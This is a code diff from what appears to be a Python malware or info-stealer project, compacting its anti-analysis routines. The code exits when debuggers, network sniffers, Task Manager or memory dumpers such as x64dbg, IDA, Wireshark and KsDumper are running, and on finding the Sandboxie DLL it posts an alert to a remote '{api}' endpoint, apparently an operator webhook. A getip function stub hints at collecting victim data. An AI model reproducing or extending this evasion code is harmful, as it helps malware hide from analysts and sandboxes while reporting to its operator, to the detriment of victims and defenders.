@@ -73,36 +73,21 @@ def block_debugger():
     for proc in psutil.process_iter():
         try:
             processName = proc.name()
-            if processName == "HTTPDebuggerUI.exe":
-                os._exit(1)
-            if processName == "HTTPDebuggerSvc.exe":
-                os._exit(1)
-            if processName == "Taskmgr.exe":
-                os._exit(1)
-            if processName == "ProcessHacker.exe":
-                os._exit(1)
-            if processName == "Wireshark.exe":
-                os._exit(1)
-            if processName == "OLLYDBG.EXE":
-                os._exit(1)
-            if processName == "x64dbg.exe":
-                os._exit(1)   
-            if processName == "x32dbg.exe":
-                os._exit(1)     
-            if processName == "x96dbg.exe":
-                os._exit(1)
-            if processName == "ida64.exe":
-                os._exit(1)   
-            if processName == "KsDumperClient.exe":
-                os._exit(1) 
-            if processName == "KsDumper.exe":
-                os._exit(1) 
-            if processName == "pestudio.exe":
-                os._exit(1)
-            if processName == "Fiddler.exe":
-                os._exit(1)
-        except:
-            pass
+            if processName == "HTTPDebuggerUI.exe": os._exit(1)
+            if processName == "HTTPDebuggerSvc.exe": os._exit(1)
+            if processName == "Taskmgr.exe": os._exit(1)
+            if processName == "ProcessHacker.exe": os._exit(1)
+            if processName == "Wireshark.exe": os._exit(1)
+            if processName == "OLLYDBG.EXE": os._exit(1)
+            if processName == "x64dbg.exe": os._exit(1)   
+            if processName == "x32dbg.exe": os._exit(1)     
+            if processName == "x96dbg.exe": os._exit(1)
+            if processName == "ida64.exe": os._exit(1)   
+            if processName == "KsDumperClient.exe": os._exit(1) 
+            if processName == "KsDumper.exe": os._exit(1) 
+            if processName == "pestudio.exe": os._exit(1)
+            if processName == "Fiddler.exe": os._exit(1)
+        except: pass
 
 def block_dlls():
     time.sleep(0.7)
@@ -110,8 +95,7 @@ def block_dlls():
         sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
         requests.post(f'{api}',json={'content': f"**Sandboxie DLL Detected**"})
         os._exit(1)
-    except:
-        pass  
+    except: pass  
 
 def getip():
     ip = "None"
